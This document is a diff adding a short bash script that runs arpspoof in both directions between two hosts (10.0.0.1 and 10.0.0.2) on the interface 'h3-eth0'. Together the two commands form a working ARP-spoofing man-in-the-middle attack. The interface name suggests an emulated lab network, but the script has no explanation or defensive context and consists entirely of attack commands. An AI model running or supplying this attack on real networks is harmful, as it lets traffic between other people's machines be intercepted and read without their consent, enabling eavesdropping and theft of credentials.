@@ -1,0 +1,9 @@
+#!/bin/bash
+
+TARGET1_IP="10.0.0.1"
+TARGET2_IP="10.0.0.2"
+
+INTERFACE="h3-eth0"
+
+arpspoof -i $INTERFACE -t $TARGET1_IP $TARGET2_IP &
+arpspoof -i $INTERFACE -t $TARGET2_IP $TARGET1_IP &
